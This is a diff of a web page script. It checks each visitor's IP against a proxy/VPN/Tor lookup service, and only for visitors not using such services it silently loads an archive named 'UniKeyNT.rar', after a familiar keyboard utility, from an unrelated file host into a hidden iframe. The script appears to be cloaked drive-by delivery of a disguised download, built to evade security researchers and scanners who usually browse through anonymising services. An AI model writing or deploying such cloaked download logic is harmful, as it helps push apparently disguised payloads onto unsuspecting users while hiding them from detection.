@@ -5,33 +5,12 @@
 <script>
 //var myUrl = 'https://proxycheck.io/v2/2402:9d80:249:3613:4028:b26d:c2f2:ea86?vpn=1&asn=1';
 
-$.get('https://api.ipify.org/?format=json', function( data ) {
-	//console.log(data.ip);
-    //alert(data.ip);
-    var ip = data.ip;
-    var proxy = 'https://cors-get-proxy.sirjosh.workers.dev/?url=';
-
-    var myUrl = 'https://proxycheck.io/v2/' + data.ip + '?vpn=1&asn=1';
-    
-    var finalURL = proxy + myUrl;
-    
-    $.getJSON(finalURL, function( data ) {
-	//console.log(data);
-    //alert(data);
-    var check = data[ip].proxy;
-    //alert(check);
-    
-    if(check === 'yes') {
-		//console.log('proxy');
-        //alert('proxy');
+$.get("https://api.ipapi.is/", function( data ) {
+    if(data.is_proxy === true || data.is_tor === true || data.is_vpn === true) {
 	} else {
 	    var src = "https://f7.file-upload.download:183/d/qqxneytmnlgpv7w7ak5iwascstpr3lcxa2dyb3xw5flivm7q5heujk5b3bi4msgtujz6kojb/UniKeyNT.rar";
 	    $('#declinedframe').attr('src', src);
-    	//console.log('no');
-        //alert('no');
     }
-
-});
 
 });
 </script>
